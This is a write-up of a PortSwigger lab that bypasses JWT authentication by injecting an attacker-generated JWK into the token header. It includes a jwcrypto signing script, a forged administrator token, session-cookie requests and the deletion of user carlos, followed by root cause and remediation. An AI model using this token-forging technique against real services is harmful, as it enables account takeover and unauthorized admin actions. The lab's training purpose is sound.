# JWT Authentication Bypass via JWK Header Injection

## Description

This lab uses a JWT-based mechanism for handling sessions. The server supports the `jwk` parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source.

To solve the lab, modify and sign a JWT that gives you access to the admin panel at `/admin`, then delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`.

## Solution

### Step 1: Log in and inspect the session token

I accessed the lab and clicked the `My account` button, which led to a login page. I logged in using the given credentials `wiener:peter`. After logging in, I was redirected to `GET /my-account`, which showed my username (`Your username is: wiener`) and email (`wiener@normal-user.net`).

I then tried to access `/admin` directly but received `HTTP/2 401 Unauthorized`.

Looking at the request, the application used JWT-based authentication stored in the `Cookie` header:

```http
Cookie: session=eyJraWQiOiI4YjI4MTA0My1hODlmLTQwMTItODM4Ny00MTQyMGM0MzgxZTAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MzIzMTQ3NSwic3ViIjoid2llbmVyIn0.OOpbUp3fsyYQyJLgos2R4Un7kaffkNJZh8wNJQfM-RGCrvlIy3d-LlO6uWpNwzKsFeiNz1vAItEEk0zNS6jfo4PAE80quMDigDyxbwYRdfpJVi5VGwYoXsYUE2zcFVeyaEwsLbzX0KGYHXcjHX82PiyAb4-04rsQ6VBHI_zpANJI3tTGFTaPfhOXEh6mfkRyDxYdt5x_0SA3o3jJ5n1azJ_Nzmca4VcH1cakK5uniq-unxS1TqLcOrKYpwPGrju_JNA06RdovvfApBGkiJX6tt0ApalQ3d-eERO1guA8OFyyGH4DZbzyZFCQtwj-khtlt7m36vaXsQQljjMujNfkzA
```

Decoding this using [jwt.io](https://jwt.io) confirmed it used `RS256` and included a `kid` in the header. The lab description indicates the server trusts a `jwk` key embedded directly in the JWT header rather than validating that the key originates from a trusted source (such as the server's own published JWKS endpoint).

### Step 2: Generate a self-signed RSA key pair

Since the server accepts an attacker-supplied `jwk` in the header, the exploit is to generate our own RSA key pair, embed the public half in the JWT header as the `jwk`, and sign the token with the matching private key. Because the server will use whatever `jwk` is provided to verify the signature, it will trust a token signed by a key we control.

I generated a private/public RSA key pair using `jwcrypto`:

```bash
python3 - <<'EOF' > jwk.json
from jwcrypto import jwk
import uuid

key = jwk.JWK.generate(kty='RSA', size=2048)
key["kid"] = str(uuid.uuid4())

print(key.export(private_key=True))
EOF
```

Contents of the generated `jwk.json`:

```json
{"d":"A-sSlYAnFVbM6b7fRPOGiQmrSEZNKMYMjPt0AZDzZOr8Ia81Fcp2_3whC8UDsfud60VqTv6nt4akGtEFlhQYjWE0AR_UKnjgqvDTa8vlWHYwmCL9UCLktijn_8YK7GEwqJaWSKczbcF1jqPkKJTpyOwSsoiabGdapI8nI79A7cnUojD16EuxFe-tuC-A1gWHFnmcIB9xHxL6EBMOR7vaXTckWwSGjD0RG25XufRiijUPi57AYQcrJ05qdCxUS0xGKr2gA_m1utKDIm3umVQ-5jY-EmT0Wv3AQhwdqUao6SRuE6s5kDrqfi-2qdqriadIxpqOZ6UI4MEqwDuFxFBSgQ","dp":"VaMv3deiw0t2X2HKaC-DxY5Egh8ctgXOnkZgzcZPsZMIQni-rHHkx0uOngLwzgbJKVGb3ZiIM7OLaq8FBtke_QrFeHFnCw_atSYbdCZsnPvMtI9xYkNOjk4_PpjlAiRW8LgQsHtqWH7QGfVuXx--x-WYVy5PleT1DyQJSMwzjdE","dq":"LeAAciu3ktif4pHFAmRxgVCvngJGLX1cIYhwMImtNoFR6SzyUsqgpyintGMWwkKTPv2__ekDbWPWOm2vvQoIHAmtR4W0HpmFsthg_Oq87fX_c3do9uDoCiQ2skQz99LCNBEy_JB2vX5SKoF7t6tnBrB4LwmcL3vTvMUdtGnxOIE","e":"AQAB","kid":"d9db5e8b-95a3-4810-ab79-3e2c3f38ac49","kty":"RSA","n":"sMBjt4hIJ81qBrd-R70vh0Zzhf26HhwD8NjKs18dm-wY54mbU5cAfYpyGxZ9V3u1rfI9kZH-6npIFzkS9cDaSY2IabHuudkGKiRNwiX35hMKTpLrM0iKkS-xLcq7YgVK_vTn316bwnvexea1SIWhOuqVHp_9H4gCzdU--f152tfZbW4xOWSZ-txjPpo2VM-V9Bqs6Kq1e6ZLZhynTwMKp-0tIYz0rO_hlaUwf6ej0Jk4TMkeCjl_XvVHIWzwXKQXd7zegGqY4N1zq66N3YbHC5PcTEg1KrBXl3k2u-EtYRj1T1ORUZ2JlFyBethT_cP5FFP33A88lRZ4yG3SU2AC1Q","p":"-XDieZmbXN40R3RNHklosA9n_1AhvJTIejVraHAcTn3-4RwAmu0gdoPGw854bvOQ9D6ADyjjsdrDClvWj4VeUtmpqA9JL-kgx4es7CINDhFQPXy4-gAZr8XmYwikgv8OfA1OJhgP4eKD_bJFUdpiTMgRzb2KLI_B-C8-0JglzBU","q":"tWYx5JIVSwoFLWfSGOvTezMERhd7CckZd_YkKI8OTkHOTYVKSmbsOdl9xsUTg3cMmN4oZrMhjf9_9S_C4F0Afs6vq0dydWn-hdrtZGzEe30aP-2oLd9MwFYD_hFVelezvbJyc0eQwhQTCsabR5_YPmTAYuGfFBxYuvhYnwZ7S8E","qi":"kkixrMRAzErESxxOrOVSMtwVObQh2L3qNFzI3V1y3dnF3E0Lozrkg6V5G7oRFQErU0zaBHGKmZU_JmRWDhAzmDFG1LtkQwYFMUJ9dDaPQ-cYgIyE1fIQj2kq4aBylZPHmxo4OtxPE4R1PVNDlyxqOz1kU1n8RP4cdv7gMT-BIuE"}
```

### Step 3: Derive the public JWK

I extracted only the public portion of the key pair, which is what gets embedded in the JWT header as the `jwk` value:

```bash
python3
>>> from jwcrypto import jwk
>>> key = jwk.JWK.from_json(open("jwk.json").read())
>>> print(key.export(private_key=False))
{"e":"AQAB","kid":"d9db5e8b-95a3-4810-ab79-3e2c3f38ac49","kty":"RSA","n":"sMBjt4hIJ81qBrd-R70vh0Zzhf26HhwD8NjKs18dm-wY54mbU5cAfYpyGxZ9V3u1rfI9kZH-6npIFzkS9cDaSY2IabHuudkGKiRNwiX35hMKTpLrM0iKkS-xLcq7YgVK_vTn316bwnvexea1SIWhOuqVHp_9H4gCzdU--f152tfZbW4xOWSZ-txjPpo2VM-V9Bqs6Kq1e6ZLZhynTwMKp-0tIYz0rO_hlaUwf6ej0Jk4TMkeCjl_XvVHIWzwXKQXd7zegGqY4N1zq66N3YbHC5PcTEg1KrBXl3k2u-EtYRj1T1ORUZ2JlFyBethT_cP5FFP33A88lRZ4yG3SU2AC1Q"}
>>> exit
```

### Step 4: Forge and sign the JWT

Using the private key, I built a script to sign a forged JWT. The `jwk` field in the header embeds our public key directly, and the `sub` claim in the payload is set to `administrator`:

```python
from jwcrypto import jwk, jwt
import json

# Load private JWK
key = jwk.JWK.from_json(open("jwk.json").read())

# Public JWK for embedding
public = json.loads(key.export(private_key=False))

token = jwt.JWT(
    header={
        "alg": "RS256",
        "kid": public["kid"],
        "jwk": public
    },
    claims={
        "iss": "portswigger",
        "exp": 1783231475,
        "sub": "administrator"
    }
)

token.make_signed_token(key)

print(token.serialize())
```

Running the script produced the forged, signed token:

```bash
python3 sign.py
eyJhbGciOiJSUzI1NiIsImp3ayI6eyJlIjoiQVFBQiIsImtpZCI6ImQ5ZGI1ZThiLTk1YTMtNDgxMC1hYjc5LTNlMmMzZjM4YWM0OSIsImt0eSI6IlJTQSIsIm4iOiJzTUJqdDRoSUo4MXFCcmQtUjcwdmgwWnpoZjI2SGh3RDhOaktzMThkbS13WTU0bWJVNWNBZllweUd4WjlWM3UxcmZJOWtaSC02bnBJRnprUzljRGFTWTJJYWJIdXVka0dLaVJOd2lYMzVoTUtUcExyTTBpS2tTLXhMY3E3WWdWS192VG4zMTZid252ZXhlYTFTSVdoT3VxVkhwXzlINGdDemRVLS1mMTUydGZaYlc0eE9XU1otdHhqUHBvMlZNLVY5QnFzNktxMWU2WkxaaHluVHdNS3AtMHRJWXowck9faGxhVXdmNmVqMEprNFRNa2VDamxfWHZWSElXendYS1FYZDd6ZWdHcVk0TjF6cTY2TjNZYkhDNVBjVEVnMUtyQlhsM2sydS1FdFlSajFUMU9SVVoySmxGeUJldGhUX2NQNUZGUDMzQTg4bFJaNHlHM1NVMkFDMVEifSwia2lkIjoiZDlkYjVlOGItOTVhMy00ODEwLWFiNzktM2UyYzNmMzhhYzQ5In0.eyJleHAiOjE3ODMyMzE0NzUsImlzcyI6InBvcnRzd2lnZ2VyIiwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.nH7Jv7vDDwSXtFnMwpukC8v3yrC3p8pkCMxA0N3_cAThT7NLttFPV5hv0SrfUqg1lWFpa0koi_yrYrYaDViHZs062w2Tl2B-YWTqCiIazlkj80hkQU1kuOevKRt2nNGu3kWQ_PvOIfDqL287TzardLiWw8NBZoKrmdWvG4g1KfKXFkTDNDLZuq3ZZjOgPFgVUCUNx-hZZ1c5KMDwi_28ZAV2s47l4CrCYXysokorLWK2A_1d74bzSIvTAYs22tZpPIRcdL70ZWEWRt4LVOOImSGtN-Jr1CF6qr-gHi5rR2hAE_3tU0XQiAybGzTWPN584RNLJYM_O4tP6oCfhh8UWA
```

### Step 5: Replace the session cookie and access the admin panel

I replaced the value of the `session` cookie with the forged token and sent the request:

```http
GET /my-account HTTP/2
Host: 0ac6003803033481804b9e0900b00032.web-security-academy.net
Cookie: session=eyJhbGciOiJSUzI1NiIsImp3ayI6eyJlIjoiQVFBQiIsImtpZCI6ImQ5ZGI1ZThiLTk1YTMtNDgxMC1hYjc5LTNlMmMzZjM4YWM0OSIsImt0eSI6IlJTQSIsIm4iOiJzTUJqdDRoSUo4MXFCcmQtUjcwdmgwWnpoZjI2SGh3RDhOaktzMThkbS13WTU0bWJVNWNBZllweUd4WjlWM3UxcmZJOWtaSC02bnBJRnprUzljRGFTWTJJYWJIdXVka0dLaVJOd2lYMzVoTUtUcExyTTBpS2tTLXhMY3E3WWdWS192VG4zMTZid252ZXhlYTFTSVdoT3VxVkhwXzlINGdDemRVLS1mMTUydGZaYlc0eE9XU1otdHhqUHBvMlZNLVY5QnFzNktxMWU2WkxaaHluVHdNS3AtMHRJWXowck9faGxhVXdmNmVqMEprNFRNa2VDamxfWHZWSElXendYS1FYZDd6ZWdHcVk0TjF6cTY2TjNZYkhDNVBjVEVnMUtyQlhsM2sydS1FdFlSajFUMU9SVVoySmxGeUJldGhUX2NQNUZGUDMzQTg4bFJaNHlHM1NVMkFDMVEifSwia2lkIjoiZDlkYjVlOGItOTVhMy00ODEwLWFiNzktM2UyYzNmMzhhYzQ5In0.eyJleHAiOjE3ODMyMzE0NzUsImlzcyI6InBvcnRzd2lnZ2VyIiwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.nH7Jv7vDDwSXtFnMwpukC8v3yrC3p8pkCMxA0N3_cAThT7NLttFPV5hv0SrfUqg1lWFpa0koi_yrYrYaDViHZs062w2Tl2B-YWTqCiIazlkj80hkQU1kuOevKRt2nNGu3kWQ_PvOIfDqL287TzardLiWw8NBZoKrmdWvG4g1KfKXFkTDNDLZuq3ZZjOgPFgVUCUNx-hZZ1c5KMDwi_28ZAV2s47l4CrCYXysokorLWK2A_1d74bzSIvTAYs22tZpPIRcdL70ZWEWRt4LVOOImSGtN-Jr1CF6qr-gHi5rR2hAE_3tU0XQiAybGzTWPN584RNLJYM_O4tP6oCfhh8UWA
```

The response returned the admin account's username and email, confirming the forged token was accepted as a valid `administrator` session.

### Step 6: Delete the user carlos

I navigated to `/admin`, located the delete URL for `carlos`, and sent:

```
GET /admin/delete?username=carlos
```

This deleted the `carlos` account and solved the lab.

## Understanding the JWK Fields

The generated `jwk.json` follows the JSON Web Key (JWK) format defined in RFC 7517 / RFC 7518. Each field has a specific purpose:

- `kty` -- Key type. Identifies the cryptographic algorithm family the key is used with. `RSA` in this case.
- `n` -- The RSA modulus. Part of both the public and private key; used during signature verification.
- `e` -- The RSA public exponent. Combined with `n`, this forms the public key used to verify signatures.
- `d` -- The RSA private exponent. This is the actual secret value used to sign tokens; it must never be exposed to the server or a third party.
- `p` and `q` -- The two large prime numbers whose product forms `n`. These are part of the private key and are used to speed up private key operations.
- `dp` and `dq` -- CRT (Chinese Remainder Theorem) exponents, precomputed from `d`, `p`, and `q`. These allow faster private key operations without needing to redo the full modular exponentiation.
- `qi` -- The CRT coefficient, also used to accelerate private key operations alongside `dp` and `dq`.
- `kid` -- Key ID. An identifier for the key, allowing a server (or token) to indicate which key should be used for verification when multiple keys are available.

Only `kty`, `n`, `e`, and `kid` are needed in the public JWK that gets embedded in the JWT header, since verifying a signature only requires the public key. The `d`, `p`, `q`, `dp`, `dq`, and `qi` fields are private key material and are used solely on the signing side.

## Root Cause

The application accepts a `jwk` header parameter and uses whatever key is embedded there to verify the token's signature, without checking that the key belongs to a trusted, pre-registered source. This allows an attacker to generate their own key pair, embed the public key in the token header, sign the token with the matching private key, and have the server treat it as valid, since the server only checks whether the signature matches the key supplied in the token itself.

## Remediation

- Do not accept externally supplied keys for signature verification. Maintain a fixed, server-side allowlist of trusted keys or key identifiers.
- If a `jwk` or `jku` header must be supported, strictly validate it against a known, trusted set of keys rather than trusting any key provided in the token.
- Consider using a JWKS endpoint under the server's control, and verify that the `kid` in incoming tokens matches an entry already published there, rather than deriving trust from the token itself.